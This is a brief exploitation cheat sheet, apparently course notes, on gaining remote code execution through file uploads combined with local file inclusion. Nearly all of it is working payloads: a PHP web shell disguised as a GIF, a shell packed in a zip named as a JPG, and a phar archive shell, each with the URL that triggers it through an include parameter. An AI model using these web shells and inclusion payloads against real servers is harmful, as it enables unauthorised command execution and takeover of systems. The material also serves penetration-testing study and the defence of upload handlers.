# File Upload

### Image upload

```shell-session
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

inspect the source code after uploading the image, we can get its URL

```
http://<SERVER_IP>:/index.php?language=./profile_images/shell.gif&cmd=id
```

### Zip Upload

```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded)

```
http://<SERVER_IP>:/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### Phar Upload

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

```shell-session
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded)

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
